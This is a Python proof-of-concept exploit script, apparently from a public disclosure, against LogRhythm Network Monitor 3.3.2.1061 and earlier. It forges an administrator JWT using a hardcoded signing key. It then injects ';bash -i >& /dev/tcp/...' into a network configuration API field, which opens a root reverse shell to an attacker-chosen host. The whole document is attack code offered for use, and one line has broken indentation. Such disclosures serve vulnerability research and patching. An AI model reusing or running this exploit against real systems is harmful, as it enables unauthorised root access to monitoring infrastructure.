# Public Disclosure Date: 24 Apr 2017
# Author: Francesco Oddo
# Reference: http://security-assessment.com/files/documents/advisory/Logrhythm-NetMonitor-Advisory.pdf
# Software Link: https://logrhythm.com/network-monitor-freemium/
# Version: 3.3.2.1061 (latest) or below 
# Tested On: nm_install_3.3.2.1061.iso with Freemium License (SHA256 7978f84e9fb18e2fae95f77a263801ca89b4767c95154b9ea874032081b02ce1)
# Dependencies: `pip install PyJWT`
 
import json
import requests
import argparse
import time 
import jwt
 
def forge_jwt(rhost):
    print "[+] Forging JWT authentication token"
    key = &#039;Gluten-free 100% narwhal deserunt polaroid; quinoa keytar asymmetrical slow-carb plaid occaecat nostrud green juice dolor!&#039;
 
    iat = time.time()
    exp = iat + 3600;
 
    body = json.loads(&#039;{"iat":1479893930,"exp":1479894830,"data":{"username":"admin","licensed":true,"role":"admin","timeToResetPass":false}}&#039;)
    body["iat"] = int(iat)
    body["exp"] = int(exp)
 
    token = jwt.encode(body, key, algorithm=&#039;HS512&#039;);
    return token
 
def command_inject(rhost, lhost, lport, gwhost, ifname):
    uri = "https://%s/data/api/configuration/" % rhost
    json_body = json.loads(&#039;{"type":"network","configurations":[{"name":"interface","value":"","isToggle":false},{"name":"method","value":true,"isToggle":true},{"name":"ipAddress","value":"","isToggle":false},{"name":"netMask","value":"255.255.255.0","isToggle":false},{"name":"gateway","value":"","isToggle":false},{"name":"dnsServers","value":"","isToggle":false},{"name":"searchDomains","value":"","isToggle":false}],"diffFields":["dnsServers"]}&#039;)
    payload = ";bash -i >& /dev/tcp/%s/%s 0>&1" % (lhost, lport)
        json_body["configurations"][0]["value"] = ifname
    json_body["configurations"][2]["value"] = rhost
    json_body["configurations"][3]["value"] = payload
    json_body["configurations"][4]["value"] = gwhost
    json_body["configurations"][5]["value"] = gwhost
    jwt = forge_jwt(rhost)
    auth_header = {&#039;Token&#039;: jwt}
    print "[+] Initiating reverse shell via command injection at %s:%s" % (lhost, lport)
    requests.post(url=uri, json=json_body, headers=auth_header, verify=False)
 
if __name__ == &#039;__main__&#039;:
    parser = argparse.ArgumentParser(description=&#039;LogRhythm Network Monitor Root Remote Command Execution PoC&#039;)
    parser.add_argument(&#039;--rhost&#039;, help=&#039;RHOST IP address&#039;)
    parser.add_argument(&#039;--lhost&#039;, help=&#039;LHOST IP address&#039;)
    parser.add_argument(&#039;--lport&#039;, help=&#039;LPORT&#039;)
    parser.add_argument(&#039;--gwhost&#039;, help=&#039;Gateway IP address&#039;)
    parser.add_argument(&#039;--ifname&#039;, help=&#039;Target Interface Identifier&#039;, default=&#039;enp0s3&#039;)
    args = parser.parse_args()
 
    command_inject(args.rhost, args.lhost, args.lport, args.gwhost, args.ifname)

